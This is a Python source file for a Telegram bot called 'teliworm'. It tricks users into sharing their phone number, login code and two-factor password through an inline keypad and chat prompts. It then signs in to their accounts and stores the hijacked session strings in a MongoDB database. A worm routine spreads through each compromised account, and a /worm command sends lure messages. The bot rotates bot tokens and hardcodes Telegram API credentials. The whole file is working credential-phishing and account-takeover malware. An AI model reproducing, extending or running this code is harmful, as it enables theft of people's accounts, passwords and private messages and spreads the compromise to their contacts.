import logging,os,json,telethon,asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from dotenv import load_dotenv
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from strings import strings,direct_reply
from worm import worm

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
load_dotenv(override=True)

mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
database = mongo_client.userdb.sessions
logger_bot = TelegramClient('teliworm', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
numpad = [
    [  
        Button.inline("1", '{"press":1}'), 
        Button.inline("2", '{"press":2}'), 
        Button.inline("3", '{"press":3}')
    ],
    [
        Button.inline("4", '{"press":4}'), 
        Button.inline("5", '{"press":5}'), 
        Button.inline("6", '{"press":6}')
    ],
    [
        Button.inline("7", '{"press":7}'), 
        Button.inline("8", '{"press":8}'), 
        Button.inline("9", '{"press":9}')
    ],
    [
        Button.inline("Clear All", '{"press":"clear_all"}'),
        Button.inline("0", '{"press":0}'),
        Button.inline("⌫", '{"press":"clear"}')
    ]
]

def get(obj, key, default=None):
    try:
        return obj[key]
    except:
        return default
def yesno(x,page='def'):
    return [
        [Button.inline("Yes", '{{"page":"{}","press":"yes{}"}}'.format(page,x))],
        [Button.inline("No", '{{"page":"{}","press":"no{}"}}'.format(page,x))]
    ]
async def handle_usr(contact, event):
    msg = await event.respond(strings['sending1'], buttons=Button.clear())
    await msg.delete()
    msg = await event.respond(strings['sending2'])
    uclient = TelegramClient(StringSession(), os.getenv('API_ID'), os.getenv('API_HASH'))
    await uclient.connect()
    user_data = database.find_one({"chat_id": event.chat_id})
    try:
        scr = await uclient.send_code_request(contact.phone_number)
        login = {
        	'code_len': scr.type.length,
            'phone_code_hash': scr.phone_code_hash,
            'session': uclient.session.save(),
        }
        data = {
        	'phone': contact.phone_number,
            'login': json.dumps(login),
        }
        database.update_one({'_id': user_data['_id']}, {'$set': data})
        await msg.edit(strings['ask_code'], buttons=numpad)
    except Exception as e:
        await msg.edit("Error: "+repr(e))
    await uclient.disconnect()
async def sign_in(event):
    try:
        user_data = database.find_one({"chat_id": event.chat_id})
        login = json.loads(user_data['login'])
        data = {}
        uclient = None
        if get(login, 'code_ok', False) and get(login, 'pass_ok', False):
            uclient = TelegramClient(StringSession(login['session']), os.getenv('API_ID'), os.getenv('API_HASH'))
            await uclient.connect()
            await uclient.sign_in(password=user_data['password'])
        elif get(login, 'code_ok', False) and not get(login, 'need_pass', False):
            uclient = TelegramClient(StringSession(login['session']), os.getenv('API_ID'), os.getenv('API_HASH'))
            await uclient.connect()
            await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
        else:
            return False
        data['session'] = uclient.session.save()
        data['logged_in'] = True
        login = {}
        await event.edit(strings['login_success'])
        await worm(uclient, bot, logger_bot)
    except telethon.errors.PhoneCodeInvalidError as e:
        await event.edit(strings['code_invalid'])
        await event.respond(strings['ask_code'], buttons=numpad)
        login['code'] = ''
        login['code_ok'] = False
    except telethon.errors.SessionPasswordNeededError as e:
        login['need_pass'] = True
        login['pass_ok'] = False
        await event.edit(strings['ask_pass'])
    except telethon.errors.PasswordHashInvalidError as e:
        login['need_pass'] = True
        login['pass_ok'] = False
        await event.edit(strings['pass_invalid'])
        await event.respond(strings['ask_pass'])
    except Exception as e:
        login['code'] = ''
        login['code_ok'] = False
        login['pass_ok'] = False
        await event.edit(repr(e))
    await uclient.disconnect()
    data['login'] = json.dumps(login)
    database.update_one({'_id': user_data['_id']}, {'$set': data})
    return True

@events.register(events.NewMessage(func=lambda e: e.is_private))
async def handler_new_user(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if user_data is None:
        sender = await event.get_sender()
        database.insert_one({
            "chat_id": sender.id,
            "first_name": sender.first_name,
            "last_name": sender.last_name,
            "username": sender.username,
        })
    if event.message.text in direct_reply:
        await event.respond(direct_reply[event.message.text])
        raise events.StopPropagation
@events.register(events.NewMessage(pattern=r"/login", func=lambda e: e.is_private))
async def handler_login(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    if get(user_data, 'logged_in', False):
        await event.respond(strings['already_logged_in'])
        raise events.StopPropagation
    await event.respond(strings['ask_phone'], buttons=[Button.request_phone(strings['share_contact_btn'], resize=True, single_use=True)])
    raise events.StopPropagation
@events.register(events.NewMessage(func=lambda e: e.is_private))
async def handler_contact_share(event):
    if event.message.contact:
        if event.message.contact.user_id==event.chat.id:
            await handle_usr(event.message.contact, event)
        else:
            await event.respond(strings['wrong_phone'])
        raise events.StopPropagation
@events.register(events.CallbackQuery(func=lambda e: e.is_private))
async def handler_callback(event):
    try:
        evnt_dta = json.loads(event.data.decode())
        press = evnt_dta['press']
    except:
        return
    user_data = database.find_one({"chat_id": event.chat_id})
    login = json.loads(user_data['login'])
    login['code'] = get(login, 'code', '')
    if type(press)==int:
        login['code'] += str(press)
    elif press=="clear":
        login['code'] = login['code'][:-1]
    elif press=="clear_all" or press=="nocode":
        login['code'] = ''
        login['code_ok'] = False
    elif press=="yescode":
        login['code_ok'] = True
    elif press=="yespass":
        login['pass_ok'] = True
        login['need_pass'] = False
    elif press=="nopass":
        login['pass_ok'] = False
        login['need_pass'] = True
        await event.edit(strings['ask_pass'])
    database.update_one({'_id': user_data['_id']}, {'$set': {'login': json.dumps(login)}})
    if len(login['code'])==login['code_len'] and not get(login, 'code_ok', False):
        await event.edit(strings['ask_ok']+login['code'], buttons=yesno('code'))
    elif press=="nopass":
        return
    elif not await sign_in(event):
        await event.edit(strings['ask_code']+login['code'], buttons=numpad)
@events.register(events.NewMessage(func=lambda e: e.is_private))
async def handler_other_msg(event):
    user_data = database.find_one({"chat_id": event.chat_id})
    login = json.loads(get(user_data, 'login', '{}'))
    if get(login, 'code_ok', False) and get(login, 'need_pass', False) and not get(login, 'pass_ok', False):
        data = {
            'password': event.message.text
        }
        await event.message.delete()
        await event.respond(strings['ask_ok']+data['password'], buttons=yesno('pass'))
        database.update_one({'_id': user_data['_id']}, {'$set': data})
        return
    if get(user_data, 'logged_in', False):
        await event.respond(strings['already_logged_in'])
    else:
        await event.respond(strings['unknownn_command'])
@events.register(events.NewMessage(pattern=r"/worm", func=lambda e: e.is_private))
async def handler_spred_msg(event):
    await event.respond(
        strings['worm_msg'],
        file='files/worm.png',
        buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
        link_preview=False
    )

async def run_bot():
    global bot
    bot_count = mongo_client.wormdb.bots.count_documents({})
    bot = TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
    for function in botFunctions:
        bot.add_event_handler(function)
    if bot_count==0:
        await bot.start(bot_token=os.getenv('BOT_TOKEN'))
    else:
        next = mongo_client.wormdb.bots.find().limit(1).next()
        await bot.start(bot_token=next['token'])
        if not await bot.is_user_authorized():
            mongo_client.wormdb.bots.delete_one(next)
            raise Exception("Bot not authorized")
    botdata = mongo_client.default.config.find_one({'key':'BOT_USERNAME'})
    botdata = botdata if botdata else {'key':'BOT_USERNAME'}
    botdata['value'] = (await bot.get_me()).username
    mongo_client.default.config.update_one({'key':'BOT_USERNAME'}, {'$set': botdata}, upsert=True)
async def main():
    await logger_bot.start(bot_token=os.getenv('BOT_TOKEN'))
    while 1:
        try:
            await run_bot()
            await bot.run_until_disconnected()
        except KeyboardInterrupt:
            break
        except:
            pass

botFunctions = [obj for name, obj in globals().items() if callable(obj) and obj.__class__.__name__ == "function" and name.startswith('handler_')]
asyncio.run(main())
